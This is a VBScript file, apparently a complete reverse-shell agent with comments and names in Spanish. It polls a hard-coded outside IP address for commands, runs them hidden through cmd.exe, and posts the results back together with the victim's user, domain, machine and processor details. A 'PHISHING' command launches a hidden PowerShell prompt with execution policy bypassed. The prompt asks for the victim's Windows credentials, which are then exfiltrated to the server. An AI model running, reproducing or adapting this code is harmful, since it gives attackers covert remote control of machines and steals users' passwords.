Option Explicit
On Error Resume Next

Dim url, httpreq, httpreqpost, comando, terminar, result, info
url="http://152.139.126.35/apps/vbs_reverse_server.py"
terminar = false

while terminar <> true
    WScript.Sleep 5000
    Set httpreq = WScript.CreateObject("MSXML2.ServerXMLHTTP")
    httpreq.Open "GET", url, false
    httpreq.Send

    WScript.Sleep 1000

    if httpreq.status = 200 then

        if len(Trim(httpreq.responseText)) <> 0 then
        
            comando = Trim(httpreq.responseText)
            comando = Replace(comando, vbLf, "")

            if instr(comando, "SALIR") Then
                terminar = true

            elseif instr(comando, "DETENER") Then
                WScript.Sleep 5000
  
            elseif instr(comando, "PHISHING") Then
                comando="powershell -ep Bypass -w hidden -c $credential=$host.ui.PromptForCredential('Se requieren credenciales para continuar', 'Por favor ingrese su usuario y password.', '', '');$creds=$credential.GetNetworkCredential();$user=$creds.username;$pass=$creds.password;$resultado=$user+'/'+$pass;Add-Type -AssemblyName System.Windows.Forms;[Windows.Forms.Clipboard]::SetText($resultado)"
                comando=Replace(comando, vbLf, "")
                result=ejecutarps(comando)
                info=oinfo()
                result="commandresult="&result&"&inforesult="&info
                httppost url,result

            else

                result=ejecutarcommando(comando)
                info=oinfo()
                result="commandresult="&result&"&inforesult="&info

                httppost url,result

            end if
        end if
    end if
wend

Sub httppost(url,variables)
 Set httpreqpost = WScript.CreateObject("MSXML2.ServerXMLHTTP")
 httpreqpost.Open "POST", url, false
 httpreqpost.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
 httpreqpost.setRequestHeader "Content-Length", Len(variables)
 httpreqpost.Send(variables)
End Sub

Function ejecutarcommando(comando)
 Dim instruccion
 instruccion = "cmd.exe /c " & comando & " | clip.exe"
 CreateObject("WScript.Shell").Run instruccion, 0, True
 ejecutarcommando = CreateObject("htmlfile").ParentWindow.ClipboardData.GetData("text")
End Function

Function ejecutarps(comando)
 Dim instruccion
 instruccion = "cmd.exe /c " & comando
 CreateObject("WScript.Shell").Run instruccion, 0, True
 WScript.Sleep 40000
 ejecutarps = CreateObject("htmlfile").ParentWindow.ClipboardData.GetData("text")
End Function

Function oinfo()
 Dim miinfo
 Dim vget
 Set vget = CreateObject( "WScript.Shell" )
 miinfo = "Usuario :" & vget.ExpandEnvironmentStrings("%Username%") & " (" & vget.ExpandEnvironmentStrings("%USERDOMAIN%") & ") " & Chr(10) & "Nombre PC:" & vget.ExpandEnvironmentStrings("%COMPUTERNAME%") & Chr(10) & "OS:" & vget.ExpandEnvironmentStrings("%OS%") & Chr(10) & "Procesador:" & vget.ExpandEnvironmentStrings("%PROCESSOR_IDENTIFIER%") & Chr(10) & "Arquitectura:" & vget.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%")
 oinfo = miinfo
End Function
